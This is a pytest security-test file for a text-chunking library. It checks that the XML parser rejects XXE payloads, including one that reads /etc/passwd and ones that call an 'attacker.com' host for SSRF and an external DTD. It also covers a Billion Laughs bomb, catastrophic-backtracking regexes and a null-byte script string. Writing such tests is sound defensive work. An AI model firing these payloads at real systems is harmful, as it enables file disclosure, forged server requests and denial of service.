# test_security_fixed.py
"""
Fixed security-focused tests for the Chunking module.
Tests protection against various attack vectors including XXE, ReDoS, and malicious inputs.
"""

import pytest
import json
import time
import re
import signal
import threading
import socket
import os
import sys
from unittest.mock import patch, MagicMock
from contextlib import contextmanager

from tldw_chatbook.Chunking.engine import (
    Chunker,
    InvalidInputError,
    ChunkingError,
)
from tldw_chatbook.Chunking.engine.strategies.json_xml import XMLChunkingStrategy
import tldw_chatbook.Chunking._shims.config as _cfg_mod


# Keep regex ops snappy across all tests via config.txt loader; avoid env toggles
@pytest.fixture(autouse=True)
def _patch_chunking_regex_policy(monkeypatch):
    class _DummyCfg:
        def has_section(self, name):
            return name == "Chunking"

        def get(self, section, key, fallback=None):
            mapping = {
                "regex_timeout_seconds": "0.5",
                "regex_disable_multiprocessing": "1",
                "regex_simple_only": "1",
            }
            return mapping.get(key, fallback)

    monkeypatch.setattr(_cfg_mod, "load_comprehensive_config", lambda: _DummyCfg())


class TestXXEProtection:
    """Test protection against XML External Entity (XXE) attacks."""

    def test_xxe_file_disclosure_prevented(self):
        """Test that XXE file disclosure attacks are prevented."""
        strategy = XMLChunkingStrategy()

        # Classic XXE attack trying to read /etc/passwd
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>
            <data>&xxe;</data>
        </root>"""

        # Should either reject the XML or parse without expanding the entity
        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)

    def test_xxe_ssrf_prevented(self):
        """Test that XXE SSRF (Server-Side Request Forgery) attacks are prevented."""
        strategy = XMLChunkingStrategy()

        # XXE attempting to make HTTP request
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "http://attacker.com/steal-data">
        ]>
        <root>
            <data>&xxe;</data>
        </root>"""

        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)

    def test_billion_laughs_dos_prevented(self):
        """Test that Billion Laughs (XML bomb) DoS attacks are prevented."""
        strategy = XMLChunkingStrategy()

        # Billion Laughs attack - exponential entity expansion
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <lolz>&lol4;</lolz>"""

        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)

    def test_external_dtd_prevented(self):
        """Test that external DTD loading is prevented."""
        strategy = XMLChunkingStrategy()

        # Attempt to load external DTD
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
        <root>
            <data>test</data>
        </root>"""

        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)

    def test_safe_xml_parsing_works(self):
        """Test that legitimate XML still parses correctly."""
        strategy = XMLChunkingStrategy()

        # Safe, legitimate XML
        safe_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <root>
            <chapter>Chapter 1</chapter>
            <chapter>Chapter 2</chapter>
            <chapter>Chapter 3</chapter>
        </root>"""

        # Should parse successfully
        chunks = strategy.chunk(safe_xml, max_size=100)
        assert len(chunks) > 0
        assert all(isinstance(chunk, str) for chunk in chunks)


class TestReDoSProtection:
    """Test protection against Regular Expression Denial of Service (ReDoS) attacks."""

    def _internet_available(self, timeout: float = 0.5) -> bool:
        """Return True if outbound network appears available.

        Uses short TCP connection attempts to well-known public DNS IPs.
        Keeps timeouts tiny to avoid slowing collection when offline.
        """
        try:
            for host in ("1.1.1.1", "8.8.8.8", "9.9.9.9"):
                try:
                    with socket.create_connection((host, 53), timeout=timeout):
                        return True
                except OSError:
                    continue
        except Exception:
            _ = None
        return False

    @pytest.mark.timeout(10)  # Pytest timeout as backup
    def test_complex_regex_timeout(self):
        """Test that complex regex patterns are properly rejected or timeout."""
        # Bound regex execution quickly and reject complex patterns fast
        os.environ["CHUNKING_REGEX_TIMEOUT"] = "0.5"
        os.environ["CHUNKING_REGEX_SIMPLE_ONLY"] = "1"
        chunker = Chunker()

        # Potentially dangerous regex patterns (catastrophic backtracking)
        evil_patterns = [
            r"(a+)+b",  # Nested quantifiers
            r"(a*)*b",  # Nested quantifiers with *
            r"((a+)+)+b",  # Deeply nested
            r"(a+){2,}b",  # Exponential with range
        ]

        for evil_pattern in evil_patterns:
            # Input designed to cause exponential backtracking
            # Using shorter input to avoid actual hang during test
            malicious_input = "a" * 20  # Reduced from 30

            # Create a text with the pattern
            text = f"Chapter matching {malicious_input} and more text"

            start_time = time.time()

            # This should either be rejected during validation or timeout quickly
            try:
                result = chunker.chunk_text(
                    text, method="ebook_chapters", custom_chapter_pattern=evil_pattern, max_size=100, overlap=0
                )

                # If it doesn't raise, it should at least complete quickly
                elapsed_time = time.time() - start_time
                assert elapsed_time < 3.0, f"Pattern {evil_pattern} took too long ({elapsed_time:.2f}s)"

            except (InvalidInputError, ChunkingError) as e:
                # Expected - pattern was rejected
                elapsed_time = time.time() - start_time
                assert elapsed_time < 3.0, f"Pattern rejection took too long ({elapsed_time:.2f}s)"
                # Verify it was rejected for the right reason
                assert any(
                    keyword in str(e).lower() for keyword in ["dangerous", "regex", "timeout", "complexity", "pattern"]
                )
            except Exception as e:
                # Unexpected error
                elapsed_time = time.time() - start_time
                assert elapsed_time < 3.0, f"Unexpected error after {elapsed_time:.2f}s: {e}"
                raise

    @pytest.mark.timeout(10)
    def test_regex_complexity_limit(self):
        """Test that overly complex regex patterns are rejected."""
        os.environ["CHUNKING_REGEX_TIMEOUT"] = "0.5"
        chunker = Chunker()

        # Nested quantifiers that should be detected as dangerous
        complex_patterns = [
            r"((a*)*)*b",  # Triple nested quantifiers
            r"(a+)+$",  # Nested quantifiers with anchor
            r"(.*){10,}",  # Large repetition range with wildcard
            r"(a+)+(b+)+",  # Multiple nested groups
        ]

        text = "Sample text for testing regex patterns"

        for pattern in complex_patterns:
            # Should either reject the pattern or handle it safely
            try:
                start_time = time.time()
                result = chunker.chunk_text(
                    text, method="ebook_chapters", custom_chapter_pattern=pattern, max_size=100, overlap=0
                )

                elapsed_time = time.time() - start_time
                # If it doesn't raise an error, it should complete quickly
                assert elapsed_time < 2.0, f"Pattern {pattern} took too long"
                assert isinstance(result, list)

            except (InvalidInputError, ChunkingError) as e:
                # Expected - pattern was rejected
                assert any(keyword in str(e).lower() for keyword in ["dangerous", "regex", "complexity", "invalid"])

    def test_safe_patterns_work(self):
        """Test that safe regex patterns work correctly."""
        chunker = Chunker()

        # Safe patterns that should work
        safe_patterns = [
            r"Chapter \d+",  # Simple literal with digit
            r"^Chapter [IVX]+$",  # Roman numerals
            r"Section \w+",  # Word characters
            r"Part [A-Z]",  # Character class
        ]

        text = "Chapter 1\nSome content\nChapter 2\nMore content"

        for pattern in safe_patterns:
            try:
                result = chunker.chunk_text(
                    text, method="ebook_chapters", custom_chapter_pattern=pattern, max_size=100, overlap=0
                )
                assert isinstance(result, list)
                assert len(result) > 0
            except Exception as e:
                pytest.fail(f"Safe pattern {pattern} was rejected: {e}")


class TestInputSanitization:
    """Test input sanitization and validation."""

    def test_null_byte_injection_prevented(self):
        """Test that null byte injection is handled safely."""
        chunker = Chunker()

        # Text with null bytes that could cause issues
        malicious_text = "Normal text\x00<script>alert('xss')</script>"

        # Should handle null bytes safely
        result = chunker.chunk_text(malicious_text, method="words", max_size=10)

        # Null bytes should be handled (removed or escaped)
        for chunk in result:
            # Either null bytes are removed or preserved safely
            assert "\x00" not in chunk or chunk.count("\x00") == malicious_text.count("\x00")

    def test_unicode_normalization(self):
        """Test that unicode is properly normalized to prevent bypasses."""
        chunker = Chunker()

        # Different unicode representations of the same character
        text_variations = [
            "test\u00e9",  # é as single character
            "test\u0065\u0301",  # e + combining acute accent
        ]

        results = []
        for text in text_variations:
            result = chunker.chunk_text(text, method="words", max_size=10)
            results.append(result)

        # Both should produce consistent results
        assert len(results[0]) == len(results[1])

    def test_oversized_input_rejected(self):
        """Test that oversized inputs are rejected to prevent DoS."""
        # Use a small max_text_size to avoid generating massive inputs
        from tldw_chatbook.Chunking.engine.base import ChunkerConfig

        chunker = Chunker(config=ChunkerConfig(max_text_size=1024))

        # Minimal oversize to trigger the check without heavy CPU/memory
        huge_text = "a" * 1025

        with pytest.raises(InvalidInputError, match="exceeds maximum allowed size"):
            chunker.chunk_text(huge_text)

    def test_deeply_nested_json_limited(self):
        """Test that deeply nested JSON has depth limits."""
        from tldw_chatbook.Chunking.engine.strategies.json_xml import JSONChunkingStrategy

        strategy = JSONChunkingStrategy()

        # Create deeply nested JSON
        def create_nested_json(depth):
            if depth == 0:
                return {"value": "leaf"}
            return {"nested": create_nested_json(depth - 1)}

        # Very deep nesting could cause stack overflow and long decode times
        # Keep depth modest to ensure fast execution while still exercising limits
        depth = min(100, sys.getrecursionlimit() - 100)
        try:
            deep_json = json.dumps(create_nested_json(depth))
        except RecursionError:
            # Environment recursion limits are too low; treat as acceptable guard
            return

        # Should either handle gracefully or reject
        try:
            result = strategy.chunk(deep_json, max_size=10)
            # If it succeeds, should return valid chunks
            assert isinstance(result, list)
        except (InvalidInputError, RecursionError, json.JSONDecodeError):
            # Expected - deep nesting was rejected
            pass


class TestResourceLimits:
    """Test that resource limits are properly enforced."""

    @pytest.mark.timeout(10)
    def test_memory_limit_enforcement(self):
        """Test that memory usage is limited."""
        chunker = Chunker()

        # Large but within limits
        # Keep size reasonable to avoid pathological allocations during CI
        large_text = "word " * 200_000  # ~1MB

        # Should process without issue
        result = chunker.chunk_text(large_text, method="words", max_size=1000)
        assert len(result) > 0

    @pytest.mark.asyncio
    @pytest.mark.timeout(10)
    async def test_concurrent_request_limits(self):
        """Test that concurrent requests are handled properly."""
        # --- Ported (chunking-engine-parity Task 4) -------------------------
        # async_chunker depends on server-only http_client/exceptions modules
        # and is deferred to sub-project #6 (spec §5.1 deferrals).
        pytest.importorskip(
            "tldw_chatbook.Chunking.engine.async_chunker",
            reason="async_chunker deferred to #6 (server http_client/exceptions deps)",
        )
        from tldw_chatbook.Chunking.engine.async_chunker import AsyncChunker
        import asyncio

        chunker = AsyncChunker()

        # Create reasonable number of concurrent requests
        tasks = []
        for i in range(10):  # Reduced from 100
            text = f"Test text {i} " * 100
            task = chunker.chunk_text(text, method="words", max_size=10)
            tasks.append(task)

        # Should handle all requests
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # All should succeed
        successful = [r for r in results if not isinstance(r, Exception)]
        assert len(successful) == len(tasks)

        await chunker.close()


class TestSecurityHeaders:
    """Test security-related configurations and headers."""

    def test_default_safe_configuration(self):
        """Test that default configuration is secure."""
        chunker = Chunker()

        # Check that security features are enabled by default
        assert chunker.config.max_text_size <= 100_000_000  # Reasonable limit
        assert chunker.config.enable_cache is not None  # Cache config exists

    def test_configuration_validation(self):
        """Test that invalid configurations are rejected."""
        from tldw_chatbook.Chunking.engine.base import ChunkerConfig

        # Try to create config with invalid values
        with pytest.raises((ValueError, TypeError)):
            ChunkerConfig(max_text_size=-1)  # Negative size

        with pytest.raises((ValueError, TypeError)):
            ChunkerConfig(default_max_size=0)  # Zero chunk size


if __name__ == "__main__":
    # Avoid invoking pytest from within the test module
    # Running via pytest is the supported path for this suite.
    pass
